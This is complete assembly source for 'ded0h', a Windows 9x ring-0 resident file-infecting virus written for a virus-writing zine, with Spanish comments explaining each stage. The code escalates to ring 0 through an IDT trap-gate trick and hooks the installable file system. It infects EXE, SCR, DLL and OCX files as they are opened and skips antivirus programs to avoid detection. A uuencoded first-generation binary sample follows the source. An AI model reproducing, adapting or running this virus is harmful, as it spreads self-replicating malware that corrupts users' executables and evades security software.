;
; ded0h
; Coded by Bumblebee
;
; DISCLAIMER: Este fichero es el c¢digo fuente de un VIRUS. En esta forma
; es incapaz de hacer ning£n da¤o. El autor no se hace responsable de
; cualquier da¤o que pudiera se ocasionar debido a su uso.
;
; This file is the source code of a VIRUS. In this form is not able to
; cause any damage. The author is not resposabile of any damage that
; may occur due its usage.
;
;
; Mis amigos de DFT me pidieron que contribuyera con algo para su zine, y
; ya que fuera del vx soy un ignorante, aqui ten‚is un virus para win9x.
;
; Es un virus relativamente sencillo que emplea uno de los m£ltiples
; m‚todos existentes para conseguir saltar al anillo 0 (ring0) en
; los sistemas win9x. El ring0 no cuenta con mi afecto ya que los virus
; que emplean esos exploits no pueden funcionar en toda la plataforma
; win32, y dejar fuera a Nt y w2k no me parece bien :) Pero en ring0
; nos saltamos las APIs de M$ con lo que el tama¤o del virus se reduce
; considerablemente. Adem s, como en este caso, si el virus es residente
; contamos con residencia GLOBAL, tan complicada de conseguir en anillo 3.
;
; Es mi primer virus residente en ring0 con comportamiento 'tradicional',
; lo que lo combierte en algo aburrido (aunque resulte muy eficiente).
; Quiz s llegue algo tarde, ya que en unos 2 a¤os calculo que los virus
; de ring0 para win9x estar n pr cticamente extintos, pero eso no evita
; que pasemos un buen rato programando ;)
;
; Sin m s, paso a describir su comportamiento.
;
; Instalaci¢n:
;
; Cuando un archivo infectado se ejecuta, el virus inicia un marco SEH
; para capturar posibles excepciones. Entonces empleamos el m‚todo de
; las trap gates (una interrupci¢n mediante hardware) para que
; se produzca una excepci¢n que nos lleve al anillo 0. Simulamos un
; overflow como lo har¡a la instrucci¢n imul normalmente. Claro que esto
; s¢lo funcionara en los win9x, pero no es un problema ya que el marco
; SEH evitar  que el error en una m quina no win9x llegue a m s. En caso
; de no saltar al anillo 0 se devuelve el control al archivo infectado.
; Antes de intentar el salto a ring0 lee un byte del puerto 0ded0h.
; Si el byte obtenido es 'B' no se instala en memoria. Adem s esa lectura
; de puerto har  que se produzca una excepci¢n en m quinas no win9x (la
; instrucci¢n 'in' est  protegida en nt/w2k) que ser  capturada por el
; marco SEH.
; La instalaci¢n en memoria consiste en tomar un heap y copiar al virus
; all¡ dos veces. La primera copia ser  la que se ejecute mientras que
; la segunda se emplear  para infectar. Eso se hace as¡ porque las VxDCall
; son sustituidas en memoria por un call cuando se ejecutan y de ‚sta
; forma disponemos siempre de una copia intacta lista para infectar.
; Despu‚s se instala un manejador para el puerto 0ded0h que devuelve
; 'B' siempre que se lea un byte de ‚l y un IFS API Hook que permite
; monitorizar todas las llamadas al IFS (sistema de ficheros instalable).
; Para devolver el control al archivo infectado se calcula el posible
; desplazamiento, m s que probable en el caso de las DLL. Notar que el
; virus es totalmente reentrante en su instalaci¢n gracias a que se
; parchea el entry point del virus con c¢digo destinado a saltar al
; host en la primera ejecuci¢n, adem s del mencionado c lculo del
; realojamiento.
;
;
; Residencia:
;
; La rutina intercepta todas las llamadas a abrir fichero. Si se lleva a
; cabo la llamada IFSFN_OPEN (abrir fichero) se obtiene la path del fichero
; convirtiendo de unicode a ascii y a¤adiendo la unidad de disco en caso de
; ser necesario. Analiza la extensi¢n del fichero afectando ficheros EXE,
; SCR, DLL y OCX. Evita infectar archivos que contengan los siguientes
; pares de letras en su nombre: AV, F-, VE, AN, DR, SP, CL. De esta forma
; se evita infectar un gran n£mero de antivirus que delatar¡an la presencia
; del virus al realizar verificaciones de integridad.
;
;
; Infecci¢n:
;
; Si el fichero parece correcto, se infecta. Se trata de igual forma a los
; cuatro tipos de archivo: como DLL, por ser m s restrictivo.
; La infecci¢n se realiza aumentando la £ltima secci¢n y se emplea como
; marca de infecci¢n que el tama¤o de los archivos infectados sea mayor
; que el que especifican las cabeceras. En el proceso de infecci¢n se
; almacena el EP del host y el EP del virus para poder calcular el
; desplazamiento del host en caso de realojamiento cuando el virus se ejecute
; en ese host. Se quitan los atributos antes de la infecci¢n para luego
; restaurarlos y se preserva la fecha de la £ltima modificaci¢n.
; El checksum del PE se pone a cero, como no se actualiza ese valor resulta
; m s discreto.
;
;
; Cuando un profano en la materia pregunta '¨qu‚ hace el virus?' siempre
; espera que tenga un efecto destructivo terrible o alg£n efecto
; gr fico o similar. En este virus no hay nada de eso. Y es que lo
; m s importante de un virus, en mi opini¢n, es su capacidad para
; replicarse y mantenerse oculto a los ojos del usuario. Una sin la otra
; no tiene sentido. Eso es lo que hace este virus.
;
; El fuente esta mas o menos bien comentado, y en castellano.
; A divertirse :)
;
;
; the way of the bee
;
.486p
locals
.model flat,STDCALL

        ; necesario para la primera generaci¢n
        extrn           ExitProcess:PROC

; una macro que nos facilitar  las cosas
VxDCall macro   vxd,service
        int     20h
        dw      service
        dw      vxd
endm

; algunos equs
IFSFN_OPEN      equ     24h

VMMMANAGER      equ     0001h
INSTALLIOHND    equ     0096h

IFSMANAGER      equ     0040h
GETHEAP         equ     000dh
UNICODE2BCS     equ     0041h
IFSAPIHOOK      equ     0067h
RING0FILEIO     equ     0032h

CREATEFILE      equ     0d500h
READFILE        equ     0d600h
WRITEFILE       equ     0d601h
GETFILEATTRIB   equ     04300h
SETFILEATTRIB   equ     04301h
GETLASTWTIME    equ     04304h
SETLASTWTIME    equ     04303h
CLOSEHANDLE     equ     0d700h
GETFILESIZE     equ     0d800h

VSIZE           equ     (vEnd-vBegin)
VIRTSIZE        equ     (VirtEnd-vBegin)
VSIZEROUND      equ     ((VIRTSIZE/1024)+1)*1024

.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'

.CODE
inicio:
vBegin  label   byte
        push    ebp
        pushad                                  ; guarda todos los registros
destPatch:

        xor     edx,edx                         ; montamos un marco SEH
        lea     eax,dword ptr [esp-8]           ; para capturar posibles
        xchg    eax,dword ptr fs:[edx]          ; exepciones (eg. no estamos
        call    pushExceptionCodeAddr           ; en win9x)

        xor     eax,eax                         ; restauramos
        mov     eax,dword ptr fs:[eax]
        mov     esp,dword ptr [eax]

        xor     eax,eax                         ; y quitamos el marco
        pop     dword ptr fs:[eax]
        pop     eax

        jmp     returnHost                      ; volvemos al hoste
                                                ; no hay residencia :(
pushExceptionCodeAddr:
        push    eax

        mov     dx,0ded0h
        in      al,dx                           ; ya estamos residentes?
                                                ; ademas dar  un fault
        add     al,-'B'                         ; en los sistemas no win9x
        jz      leaveSEH

        call    getDelta                        ; obtenemos el desplazamiento
                                                ; de las variables

        ; para saltar a ring0 vamos a emplear una trapgate:
        ; generaremos un overflow mol¢n ;)

        sub     esp,8                           ; cogemos espacio en la
        mov     edx,esp                         ; pila

        mov     esi,8*4
        sidt    qword ptr [edx]                 ; cogemos la idt
        mov     edx,dword ptr [edx+2]           ; (evita 2 bytes de tama¤o)

        push    dword ptr [edx+esi]             ; guardamos la entrada
        push    dword ptr [edx+esi+4]           ; IDT para la int 4h

        lea     eax,ring0CodeInstaller+ebp      ; nuestro instalador ring0
        mov     word ptr [edx+esi],ax
        shr     eax,10h
        mov     word ptr [edx+esi+6],ax

        mov     eax,00000a03h
        push    eax                             ; simular overflow
        popfd                                   ; por imul

        into                                    ; ya est  :)

        pop     dword ptr [edx+esi+4]           ; restauramos la entrada
        pop     dword ptr [edx+esi]             ; IDT para la int 4h

        add     esp,8                           ; liberar pila

leaveSEH:
        xor     eax,eax                         ; quita el marco SEH
        pop     dword ptr fs:[eax]
        pop     eax        

returnHost:
patchCode:
        call    getDelta                        ; si hay una excepci¢n
                                                ; perdemos el delta
                                                ; adem s lo necesitamos
                                                ; por el parcheo

        mov     eax,offset fakeHost             ; entry point del host
hostEP  equ     $-4
        mov     ecx,offset vBegin               ; entry point del virus
virusEP equ     $-4
        lea     edx,vBegin+ebp                  ; entry point real del virus
        sub     edx,ecx                         ; desplazamiento del virus
        add     eax,edx                         ; desplazamiento del host
        mov     dword ptr [esp+20h],eax         ; ponemos la direcci¢n de
                                                ; retorno calculada
        popad                                   ; restauramos
        ret                                     ; vuelve a casa!
patchSize       equ $-patchCode

; manejador para el puerto 0ded0h -> si se pide un byte damos 'B'
portHandler:
        or      ecx,ecx
        jnz     ignorePort
        mov     al,'B'
ignorePort:
        ret

; esta rutina se ejecuta en ring0 si todo marcha bien y el overflow
; nos catapulta a ring0. Osea que del into venimos aqu¡ y al salir de
; aqu¡ con el iretd volvemos a la instrucci¢n que sigue al into.
ring0CodeInstaller:
        pushad                                  ; gu rdalo todo

        call    getDelta                        ; obtenemos el desplazamiento
                                                ; de las variables

        ; en esta primera llamada no usamos la macro porque al ejecutarse
        ; la VxDCall se joder  por un call... como es la £nica llamada
        ; que se esco¤a antes de hacer la copia 'para infectar', solo
        ; restauramos ‚sta (mejor que restaurarlas todas, no?). en
        ; contrapartida ocupamos mas espacio en memoria... bah no llega
        ; a una p gina XD
        push    VSIZEROUND
fixVxd:
        db      0cdh,20h
        dw      GETHEAP
        dw      IFSMANAGER                      ; reservamos memoria
        pop     ecx                             ; cantidad memoria obtenida
        or      eax,eax
        jz      backR3

        cmp     ecx,VSIZEROUND                  ; memoria suficiente?
        jb      backR3

        push    eax                             ; restauramos la llamada
        lea     edi,fixVxd+ebp
        mov     ax,20cdh
        stosw
        mov     ax,GETHEAP
        stosw
        mov     ax,IFSMANAGER
        stosw
        pop     eax

        push    eax
        mov     edi,eax                         ; direcci¢n
        lea     esi,vBegin+ebp                  ; copiamos el virus
        push    esi
        mov     ecx,VSIZE
        push    ecx
        rep     movsb

        pop     ecx                             ; hacemos una copia
        pop     esi                             ; del virus para
        add     edi,offset vcopy-offset vEnd    ; infectar con ella
        rep     movsb

        pop     ebp                             ; delta en memoria
        sub     ebp,offset vBegin               ; alojada
        mov     dword ptr [hookDelta+ebp],ebp   ; guardamos el delta

        lea     esi,portHandler+ebp             ; instalamos un manejador
        mov     edx,0ded0h                      ; en un puerto (marca TSR)
        VxDCall VMMMANAGER,INSTALLIOHND
        jc      backR3                          ; la jodimos!

        lea     eax,ring0HookCode+ebp           ; instalamos el ifs
        push    eax                             ; api hook
        VxDCall IFSMANAGER,IFSAPIHOOK
        pop     edx                             ; restaura la pila
        or      eax,eax                         ; todo correcto?
        jz      backR3
                                                ; guarda el siguiente hook
        mov     dword ptr [nextHookInChain+ebp],eax

        call    getDelta                        ; obtenemos el desplazamiento
                                                ; de las variables

        lea     edi,destPatch+ebp               ; parcheamos para
        lea     esi,patchCode+ebp               ; la reentrada de las
        mov     ecx,patchSize                   ; DLLs
        rep     movsb
backR3:                                         ; v monos a ring3!
        popad
        iretd

;
; ste es nuestro hook para el IFS
;
ring0HookCode:
        push    ebp                             ; toma parametros de
        mov     ebp,esp                         ; la llamada
        sub     esp,20h                         ; arreglamos la pila

        mov     eax,18h                         ; montamos los par metros
makeParamLoop:                                  ; eax es prescindible
        push    dword ptr [ebp+eax+4]
        sub     eax,4
        jnz     makeParamLoop

        mov     al,0ffh                         ; para evitar
lockReentrace   equ $-1                         ; problemas de
        or      al,al                           ; reentrada
        jz      exitHookFast

        cmp     dword ptr [ebp+0ch],IFSFN_OPEN  ; abriendo un archivo?
        jne     exitHookFast

        pushad                                  ; gu rdalo todo

        mov     edi,12345678h                   ; nos preparamos
hookDelta       equ $-4                         ; el delta en la
                                                ; instalaci¢n, usamos edi

        inc     byte ptr [lockReentrace+edi]    ; cierra

        mov     eax,dword ptr [ebp+10h]         ; disco
        cmp     al,0ffh                         ; hay unidad?
        jne     unitOk
        mov     al,-40h                         ; no la hay
unitOk:
        add     al,40h                          ; pasar a ASCII
        mov     byte ptr [fullFilename+edi],al  ; guarda la unidad

        xor     eax,eax
        push    eax                             ; cero
        push    260                             ; tama¤o maximo
        mov     eax,dword ptr [ebp+1ch]
        mov     eax,dword ptr [eax+0ch]
        add     eax,4
        push    eax                             ; nombre unicode
        lea     esi,filename+edi
        push    esi                             ; destino
        VxDCall IFSMANAGER,UNICODE2BCS
        add     esp,10h                         ; fija la pila
        mov     byte ptr [esi+eax],0            ; fija el string

        mov     edx,eax                         ; guarda el tama¤o

        push    esi                             ; pasamos a may£sculas
caseLoop:
        lodsb
        or      al,al
        jz      notCase
        cmp     al,'a'
        jb      caseLoop
        cmp     al,'z'
        ja      caseLoop
        sub     byte ptr [esi-1],'a'-'A'
        jmp     caseLoop
notCase:
        pop     esi

        mov     ecx,dword ptr [esi+edx-4]       ; analizamos la extensi¢n
        not     ecx
        cmp     ecx,NOT 'EXE.'                  ; es un EXE?
        je      extOk
        cmp     ecx,NOT 'RCS.'                  ; es un SCR?
        je      extOk
        cmp     ecx,NOT 'LLD.'                  ; es un DLL?
        je      extOk
        cmp     ecx,NOT 'XCO.'                  ; es un OCX?
        jne     notInfectable

extOk:
        xor     ebx,ebx                         ; buscamos strings:
        sub     edx,4                           ; cuidad¡n que no sea
avSearchLoop:                                   ; un antivirus
        mov     cx,word ptr [esi+ebx] 
        not     cx
        cmp     cx,NOT 'VA'                     ; av: pav, kav, avp
        je      notInfectable
        cmp     cx,NOT '-F'                     ; f-: f-prot
        je      notInfectable
        cmp     cx,NOT 'EV'                     ; ve: vet (inoculate it)
        je      notInfectable
        cmp     cx,NOT 'NA'                     ; an: scan, viruscan
        je      notInfectable
        cmp     cx,NOT 'RD'                     ; dr: drweb
        je      notInfectable
        cmp     cx,NOT 'PS'                     ; sp: spider
        je      notInfectable
        cmp     cx,NOT 'LC'                     ; cl: clean
        je      notInfectable
        inc     ebx
        cmp     ebx,edx
        jb      avSearchLoop

infectable:
        ; en esi tenemos el nombre del fichero
        ; y si esi-2 != 0, usamos esi-2 porque tenemos una
        ; path con unidad incluida :)
        mov     al,byte ptr [esi-2]
        or      al,al
        jz      checkThisFile
        cmp     al,41h                          ; pasando de la unidad a:
        jna     notInfectable
        sub     esi,2

checkThisFile:
        call    infect                          ; que hace esto? uh? :)

notInfectable:
        dec     byte ptr [lockReentrace+edi]    ; abre
exitHook:
        popad                                   ; restaura

exitHookFast:
        mov     eax,12345678h                   ; por eso eax es 
nextHookInChain equ $-4                         ; prescindible :)
        call    dword ptr [eax]                 ; llamamos al viejo hook
        add     esp,18h                         ; arregla la pila

        leave                                   ; restaura la pila
        ret                                     ; y a correr

;
; Y as¡ se hizo el codigo realojable :)
;
getDelta:
        call    deltaOffset
deltaOffset:
        pop     ebp
        sub     ebp,offset deltaOffset
        ret
;
; solo para ahorrar espacio
;
ring0IO:
        VxDCall IFSMANAGER,RING0FILEIO
        ret

;
; intenta infectar el fichero apuntado por esi
;
infect:
        pushad                                  ; guardando...

        call    getDelta                        ; desplazamiento otra vez
                                                ; esta vez por comodidad

        mov     eax,GETLASTWTIME                ; tomamos la fecha de
        call    ring0IO                         ; la £ltima modificaci¢n
        jc      infectionError
        mov     dword ptr [lastWriteTime+ebp],ecx
        mov     dword ptr [lastWriteDate+ebp],edi

        mov     eax,GETFILEATTRIB               ; tomamos los atributos
        call    ring0IO
        jc      infectionError

        push    ecx                             ; guarda atributos y
        push    esi                             ; filename

        xor     ecx,ecx                         ; los limpiamos
        mov     eax,SETFILEATTRIB
        call    ring0IO
        jc      infectionErrorAttrib

        mov     ebx,2                           ; read/write
        xor     ecx,ecx                         ; atributo
        mov     edx,1                           ; falla si no existe
        mov     eax,CREATEFILE
        call    ring0IO
        jc      infectionErrorAttrib

        mov     dword ptr [fHnd+ebp],eax        ; guarda el handle

        mov     ebx,eax                         ; cogemos el tama¤o del
        mov     eax,GETFILESIZE                 ; fichero
        call    ring0IO
        jc      infectionErrorClose

        mov     dword ptr [fileSize+ebp],eax

        cmp     eax,2000h                       ; al menos 8 kbs?
        jb      infectionErrorClose

        lea     esi,mzHeader+ebp
        xor     edx,edx
        mov     ecx,40h
        mov     eax,READFILE
        call    ring0IO                         ; leemos el DOS hdr
        jc      infectionErrorClose

        cmp     word ptr [esi],'ZM'             ; es un exe?
        jne     infectionErrorClose

        mov     eax,dword ptr [esi+3ch]         ; evitamos algunos
        cmp     eax,dword ptr [fileSize+ebp]    ; headers de DOS
        ja      infectionErrorClose             ; algo txungos...

        mov     dword ptr [peHdrOffs+ebp],eax   ; guardamos el offset
                                                ; del PE hdr
        lea     esi,peHeader+ebp
        mov     edx,eax
        mov     ecx,0e8h
        mov     eax,READFILE
        call    ring0IO                         ; leemos el PE hdr
        jc      infectionErrorClose

        ; notar que leemos el header maximo posible,
        ; pero no tiene que estar todo disponible

        cmp     word ptr [esi],'EP'             ; es un PE?
        jne     infectionErrorClose

        movzx   edx,word ptr [esi+16h]          ; es ejecutable?
        test    edx,2h
        jz      infectionErrorClose

        cmp     dword ptr [esi+1ch],VSIZE       ; tiene algo de c¢digo?
        jb      infectionErrorClose             ; importante si infectamos
                                                ; DLLs ;)

        movzx   edx,word ptr [esi+5ch]          ; pasando de apps nativas
        dec     edx                             ; por temas de checksum
        jz      infectionErrorClose

        mov     eax,18h
        add     ax,word ptr [esi+14h]
        add     eax,dword ptr [peHdrOffs+ebp]   ; offset primera secci¢n
        mov     edi,eax

        mov     cx,word ptr [esi+06h]
        dec     cx
        mov     eax,28h
        mul     cx
        add     edi,eax                         ; offset de la £ltima :)

        mov     edx,edi
        mov     dword ptr [sectHdrOffs+ebp],edx ; guardamos

        lea     esi,secHeader+ebp
        mov     ecx,28h
        mov     eax,READFILE
        call    ring0IO                         ; leemos el setion hdr
        jc      infectionErrorClose

        mov     eax,dword ptr [esi+14h]         ; desplazamiento f¡sico
        add     eax,dword ptr [esi+10h]         ; tama¤o f¡sico

        cmp     eax,dword ptr [fileSize+ebp]    ; evita ficheros que
        jne     infectionErrorClose             ; puedan ser comprometidos

                                                ; adem s funciona como marca
                                                ; de infecci¢n :)

        lea     edi,peHeader+ebp                ; necesitamos el PE hdr

        xor     eax,eax
        mov     dword ptr [edi+58h],eax         ; ponemos a cero el checksum
                                                ; total, va a estar mal hehe

        mov     eax,dword ptr [esi+0ch]         ; RVA de la secci¢n
        add     eax,dword ptr [esi+10h]         ; tama¤o f¡sico

        push    edi
        push    eax
        add     eax,dword ptr [edi+34h]         ; a¤ade la image base
        mov     edx,offset virusEP-offset vBegin
        lea     edi,vcopy+ebp                   ; virusEP en la copia
        mov     dword ptr [edi+edx],eax         ; lo guardamos
        pop     eax

        pop     edx
        xchg    eax,dword ptr [edx+28h]         ; cambio de EP ;)
        add     eax,dword ptr [edx+34h]         ; a¤ade la image base

        mov     edx,offset hostEP-offset vBegin ; hostEP en la copia
        mov     dword ptr [edi+edx],eax         ; lo guardamos

        or      dword ptr [esi+24h],40000000h   ; s¢lo necesita atributo
                                                ; READ :)

        ; y que no sea DISCARDABLE... que la liamos XD
        and     dword ptr [esi+24h],NOT 02000000h

        lea     edi,peHeader+ebp                ; necesitamos el PE hdr (2)

        push    dword ptr [fileSize+ebp]        ; guardamos este tam

        mov     eax,VSIZE
        mov     edx,dword ptr [esi+10h]
        sub     dword ptr [fileSize+ebp],edx    ; le quitamos tama¤o viejo
        add     eax,dword ptr [esi+10h]         ; y calculamos el nuevo
        mov     ecx,dword ptr [edi+3ch]         ; tama¤o f¡sico
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     dword ptr [esi+10h],eax
        add     dword ptr [fileSize+ebp],eax    ; ahora tenemos un nuevo
                                                ; tama¤o de fichero

        add     eax,dword ptr [esi+0ch]         ; arreglamos el tam de la
        add     eax,VIRTSIZE-VSIZE              ; imagen
        mov     ecx,dword ptr [edi+38h]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     dword ptr [edi+50h],eax         ; arreglado

        sub     eax,dword ptr [esi+0ch]         ; y ahora arreglamos
        mov     dword ptr [esi+08h],eax         ; la virt size de la sect

        xor     eax,eax                         ; n£mero aleatorio para
otherOnePlz:                                    ; el pseudo-padding
        in      al,40h                          ; que no tiene que ver con
        or      eax,eax                         ; Aznar huahahahaha
        jz      otherOnePlz

        mov     dword ptr [padding+ebp],eax     ; el padding a a¤adir

        lea     esi,peHeader+ebp                ; guardamos el PE hdr
        mov     ecx,0e8h
        mov     edx,dword ptr [peHdrOffs+ebp]
        mov     eax,WRITEFILE
        call    ring0IO

        lea     esi,secHeader+ebp               ; guardamos la sect hdr
        mov     ecx,28h
        mov     edx,dword ptr [sectHdrOffs+ebp]
        mov     eax,WRITEFILE
        call    ring0IO

        pop     edx                             ; el viejo tama¤o
        lea     esi,vcopy+ebp                   ; guardamos el virus
        mov     ecx,VSIZE
        mov     eax,WRITEFILE
        call    ring0IO

        mov     edx,dword ptr [fileSize+ebp]    ; el nuevo tama¤o
        add     edx,dword ptr [padding+ebp]     ; m s el padding
        xor     esi,esi
        xor     ecx,ecx                         ; hacemos que
        mov     eax,WRITEFILE                   ; crezca el archivo
        call    ring0IO                         ; hasta el tam correcto

        ; se acab¢ la infecci¢n :)

infectionErrorClose:
        mov     eax,CLOSEHANDLE                 ; cerramos el fichero
        call    ring0IO

infectionErrorAttrib:
        pop     esi
        pop     ecx
        mov     eax,SETFILEATTRIB               ; restauramos los
        call    ring0IO                         ; atributos

        mov     edi,dword ptr [lastWriteDate+ebp]
        mov     ecx,dword ptr [lastWriteTime+ebp]
        mov     eax,SETLASTWTIME
        call    ring0IO                         ; restauramos la fecha

infectionError:
        popad
        ret

; datos del virus
fullFilename    db      '>:'                    ; construir la path
vEnd    label   byte

; a partir de aqu¡ son datos que no se almacenan en el
; fichero, con el consiguiente ahorro de espacio
filename        db      260 dup (0)             ; para el nombre del
                                                ; fichero
; ^ ojo con no separar esos dos X)

fHnd            dd      0                       ; manejador fichero
lastWriteTime   dd      0                       ; time del fichero
lastWriteDate   dd      0                       ; date del fichero
fileSize        dd      0                       ; tama¤o del fichero a inf
padding         dd      0                       ; padding a a¤adir
peHdrOffs       dd      0                       ; posici¢n de PE header
sectHdrOffs     dd      0                       ; posici¢n de la sect Hdr

mzHeader:                                       ; buffer para el MZ hdr
peHeader        db      0e8h dup (0)            ; buffer para el PE hdr
secHeader       db      28h dup (0)

; por qu‚ no uso VSIZE? porque el tasm es muy rarito... me da uno
; de esos errores extra¤os si pongo VSIZE aqui abajo, y VSIZE es
; vEnd-vBegin... :? quien sabe! hehehe
vcopy           db      (vEnd-vBegin) dup (0)   ; copia del virus para
                                                ; infectar
VirtEnd label   byte

fakeHost:
        push    0h
        call    ExitProcess
Ends
End     inicio

; End Of Source

- Begin of uuencoded 1st gen sample virus.uue -

_=_ 
_=_ Part 001 of 001 of file Virus.zip
_=_ 

begin 666 Virus.zip
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
)86YA9V4@:70N
`
end

- EOF -
